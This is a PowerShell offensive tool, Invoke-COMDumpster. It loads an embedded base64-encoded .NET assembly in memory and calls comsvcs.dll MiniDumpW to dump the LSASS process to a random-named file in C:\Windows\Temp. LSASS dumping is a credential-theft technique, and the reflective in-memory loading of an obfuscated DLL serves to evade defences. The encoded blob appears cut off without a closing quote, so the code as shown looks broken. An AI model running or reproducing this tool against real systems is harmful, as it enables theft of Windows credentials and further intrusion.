function Invoke-COMDumpster {
    param(
        [Parameter(Mandatory = $False)]
        [String]$DumpPath = "c:\Windows\Temp\$(New-Guid).db",
        [Parameter(Mandatory = $False)]
        [ValidateSet("full", "mini")]
        [String]$DumpType = "full",
        [Parameter(Mandatory = $False)]
        [int]$ProcID = (Get-Process lsass).Id
    )
    function Test-Administrator {  
        $user = [Security.Principal.WindowsIdentity]::GetCurrent();
    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
    }

    If (-Not (Test-Administrator)) {
        Write-Host "This must be run as an administrative PS Session"
        break
    } 

    $byteOutArray = [Convert]::FromBAsE64String("TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDALcYecsAAAAAAAAAAOAAIiALATAAAAgAAAAGAAAAAAAA1iYAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAIQmAABPAAAAAEAAALgDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAABoJgAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAA3AYAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAALgDAAAAQAAAAAQAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAC4JgAAAAAAAEgAAAACAAUAUCAAABgGAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAAPABAAAjfgAAXAIAAJQCAAAjU3RyaW5ncwAAAADwBAAABAAAACNVUwD0BAAAEAAAACNHVUlEAAAABAUAABQBAAAjQmxvYgAAAAAAAAACAAABRxUAFAkAAAAA+gEzABYAAAEAAAAQAAAAAwAAAAIAAAADAAAADgAAAA4AAAACAAAAAgAAAAEAAAABAAAAAADGAQEAAAAAAAYADgFeAgYAewFeAgYAQgAkAg8AfgIAAAYAagDuAQYA8QDuAQYA0gDuAQYAYgHuAQYALgHuAQYARwHuAQYAgQDuAQYAVgA/AgYANAA/AgYAtQDuAQYAnACZAQYAjQLnAQAAAAAYAAAAAAABAAEAgQEQADcCAAJBAAEAAQCBARAACAAAAkEAAQACAAAAAACAAJYgIQAjAAEAAAAAAIAAliARAioABAAAAAEAAQAAAAIAEQAAAAMAswEJAB4CAQARAB4CBgAZAB4CCgApAB4CEAAxAB4CEAA5AB4CEABBAB4CEABJAB4CEABRAB4CEABZAB4CEABhAB4CFQBpAB4CEABxAB4CEAB5AB4CEAAuAAsALgAuABMANwAuABsAVgAuACMAXwAuACsAdQAuADMAdQAuADsAdQAuAEMAXwAuAEsAewAuAFMAdQAuAFsAdQAuAGMAkwAuAGsAvQAuAHMAygDbAbkBRAEDACEAAQAAAQUAEQICAASAAAABAAAAAAAAAAAAAAAAAAACAAAEAAAAAAAAAAAAAAAaACsAAAAAAAAAAAAARHVtbXkxAEtlcm5lbDMyAER1bW15MgA8TW9kdWxlPgBNaW5pRHVtcFcAbXNjb3JsaWIAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBscEFyZwBrZXJuZWwzMi5kbGwAU2hhcnBDT01EdW1wc3Rlci5kbGwAY29tc3Zjcy5kbGwAU3lzdGVtAFN5c3RlbS5SZWZsZWN0aW9uAFNoYXJwQ09NRHVtcHN0ZXIAR2V0TGFzdEVycm9yAC5jdG9yAFN5c3RlbS5EaWFnbm9zdGljcwBDb21TdmNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNl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
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

    $lpArg = "{0:d} {1:s} {2:s}" -f $ProcID, $DumpPath, $DumpType

    if ( [SharpCOMDumpster.ComSvcs]::MiniDumpW(0, 0, $lpArg) ) {
        Write-Output "[+] Success, process PID=$($ProcID) dumped as '$($DumpPath)'"
    }
    else {
        Write-Error "[-] Failed to dump process:  $((New-Object System.ComponentModel.Win32Exception([int][Kernel32]::GetLastError())).Message)"
    }
}
Write-Host "Usage: Invoke-COMDumpster - Will dump LSASS to a random GUID file name in c:\Windows\Temp\"
Write-Host "       Invoke-ComDumpster [-DumpPath (DumpPath) -ProcID (Process ID)]"